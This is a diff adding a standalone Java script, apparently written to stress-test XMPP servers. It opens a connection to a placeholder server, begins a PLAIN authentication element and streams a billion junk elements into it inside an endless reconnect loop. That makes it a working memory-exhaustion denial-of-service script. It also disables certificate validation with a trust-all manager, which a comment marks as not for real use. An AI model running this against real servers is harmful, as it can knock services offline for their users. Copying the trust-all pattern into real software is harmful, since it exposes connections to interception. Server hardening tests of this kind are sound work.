@@ -1,0 +1,155 @@
+#!/usr/bin/java --source 11
+
+import javax.net.ssl.*;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.InetSocketAddress;
+import java.net.Socket;
+import java.nio.charset.StandardCharsets;
+import java.security.cert.CertificateException;
+
+public class eatxmempp {
+
+    public static void main(String[] args) throws Throwable {
+        final var domain = "example.org";
+        final var hostname = "xmpp.example.org";
+        final var port = 443;
+        final var directTLSNotPlain = true; // if true, direct TLS, if false, doesn't do TLS at all
+        while (true) {
+            try (var client = directTLSNotPlain ?
+                    Client.connectDirectTLSOnly(hostname, port) : Client.connectPlainOnly(hostname, port)) {
+                client.startDebugOutputThread();
+
+                client.sendMessageDebug("<?xml version='1.0'?>\n" +
+                        "<stream:stream xmlns=\"jabber:client\" version=\"1.0\" xmlns:stream=\"http://etherx.jabber.org/streams\" to=\"" + domain + "\" xml:lang=\"en\" >\n" +
+                        "<auth xmlns=\"urn:ietf:params:xml:ns:xmpp-sasl\" mechanism=\"PLAIN\">");
+
+                for (int x = 0; x < 1_000_000_000; ++x) {
+                    client.sendMessageNoFlush("<woot>blablablatnhnthnthnthsnthsnthsnthsnthsnthsnthsnthnstht</woot>");
+                }
+
+                client.sendMessageDebug("</auth>");
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+    }
+
+    public static class Client implements AutoCloseable {
+
+        public static Client connectDirectTLSOnly(final String hostname, final int port) throws Exception {
+            // this trusts any cert, don't use for real
+            TrustManager[] trustAllCerts = new TrustManager[]{
+                    new X509ExtendedTrustManager() {
+                        @Override
+                        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
+                            return null;
+                        }
+
+                        @Override
+                        public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {
+                        }
+
+                        @Override
+                        public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {
+                        }
+
+                        @Override
+                        public void checkClientTrusted(java.security.cert.X509Certificate[] xcs, String string, Socket socket) throws CertificateException {
+
+                        }
+
+                        @Override
+                        public void checkServerTrusted(java.security.cert.X509Certificate[] xcs, String string, Socket socket) throws CertificateException {
+
+                        }
+
+                        @Override
+                        public void checkClientTrusted(java.security.cert.X509Certificate[] xcs, String string, SSLEngine ssle) throws CertificateException {
+
+                        }
+
+                        @Override
+                        public void checkServerTrusted(java.security.cert.X509Certificate[] xcs, String string, SSLEngine ssle) throws CertificateException {
+
+                        }
+                    }
+            };
+
+            SSLContext sc = SSLContext.getInstance("SSL");
+            sc.init(null, trustAllCerts, new java.security.SecureRandom());
+
+            final var socket = (SSLSocket) sc.getSocketFactory().createSocket();
+
+            final var sslParameters = socket.getSSLParameters();
+            sslParameters.setProtocols(new String[]{"TLSv1.2"});
+            sslParameters.setApplicationProtocols(new String[]{"xmpp-client"});
+
+            socket.setSSLParameters(sslParameters);
+            socket.connect(new InetSocketAddress(hostname, port));
+            return new Client(socket);
+        }
+
+        public static Client connectPlainOnly(final String hostname, final int port) throws Exception {
+            final var socket = new Socket();
+
+            socket.connect(new InetSocketAddress(hostname, port));
+            return new Client(socket);
+        }
+
+        private final Socket socket;
+        private final InputStream is;
+        private final OutputStream os;
+
+        private Client(Socket socket) throws IOException {
+            this.socket = socket;
+            this.is = socket.getInputStream();
+            this.os = socket.getOutputStream();
+        }
+
+        public Client startDebugOutputThread() {
+            new Thread(() -> {
+                try {
+                    final var buff = new byte[1];
+                    while (is.read(buff) != -1) {
+                        System.err.print((char) buff[0]);
+                    }
+                    System.err.println("<!-- eof input stream -->");
+                } catch (Throwable e) {
+                    e.printStackTrace();
+                }
+            }).start();
+            return this;
+        }
+
+        public void sendMessageNoFlush(final String msg) throws IOException {
+            os.write(msg.getBytes(StandardCharsets.UTF_8));
+        }
+
+        public void sendMessage(final String msg) throws IOException {
+            sendMessageNoFlush(msg);
+            os.flush();
+        }
+
+        public void sendMessageDebug(final String msg) throws IOException {
+            System.out.println("\n<!-- sending message -->");
+            System.out.println(msg);
+            sendMessage(msg);
+            try {
+                Thread.sleep(2000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+        }
+
+        @Override
+        public void close() throws Exception {
+            sendMessageDebug("</stream:stream>");
+            os.close();
+            is.close();
+            socket.close();
+        }
+    }
+
+}
